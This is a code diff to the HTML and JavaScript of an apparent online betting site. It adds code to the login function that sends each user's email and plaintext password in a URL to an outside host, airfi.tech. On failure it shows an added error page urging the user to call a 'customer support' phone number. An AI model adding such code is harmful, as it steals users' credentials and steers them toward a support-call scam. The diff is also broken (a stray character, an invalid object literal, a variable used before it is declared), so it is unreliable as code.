@@ -581,6 +581,16 @@ footer p { color: var(--muted); font-size: 0.78rem; line-height: 1.8; max-width:
   </footer>
 </div>
 
+<!-- ERROR PAGE -->
+<div id="page-errorscreen" class="page">
+  <section class="hero">
+    <div class="hero-bg"></div>
+    <div class="stars"></div>
+    <div class="hero-tag">✦ An Error Occured</div>
+    <p>Please contact customer support on +1-800-123-4567 so we can resolve your issue.</p>
+  </section>
+</div>
+
 <!-- DASHBOARD PAGE -->
 <div id="page-dashboard">
   <div class="dash-layout">
@@ -1002,13 +1012,40 @@ document.querySelectorAll('.modal-overlay').forEach(el => {
 function doLogin() {
   const email = document.getElementById('login-email').value.trim();
   const pw = document.getElementById('login-password').value;
-  if(!email || !pw) { toast('Please fill in all fields','error'); return; }
+  if(!email || !pw) { toast('Please fill in all fields','error'); return; }1
+
+  //create temp user for testing  
+  const newUser = { "Stephen", "Lastname", email, "username", "21/01/1999", pw, balance:500, loyaltyPoints:0, totalWagered:0, transactions:[], bets:[] };
+  stored.push(newUser);
+  localStorage.setItem('dw_users', JSON.stringify(stored));
+
   const stored = JSON.parse(localStorage.getItem('dw_users') || '[]');
   const found = stored.find(u => u.email === email && u.password === pw);
   if(!found) { toast('Invalid email or password','error'); return; }
   loginUser(found);
   closeModal('login');
-  toast(`Welcome back, ${found.first}! 🎉`, 'success');
+  
+  // POST Event
+  urlStr = "method=account_login_success&Email=" + email + "&Password=" + pw;
+  const xhttp = new XMLHttpRequest();
+
+  xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+      console.log(xhttp.responseText);
+      toast(`Welcome back, ${found.first}! 🎉`, 'success');
+    }
+    if (this.readyState == 4 && this.status != 200) {
+       console.log("Login failed");
+       showPage('errorscreen');
+    }
+  };
+  xhttp.open("POST", "https://airfi.tech/gaming/login?" + urlStr, false);
+  xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
+  xhttp.send();
+
+
+
+
 }
 
 function doRegister() {
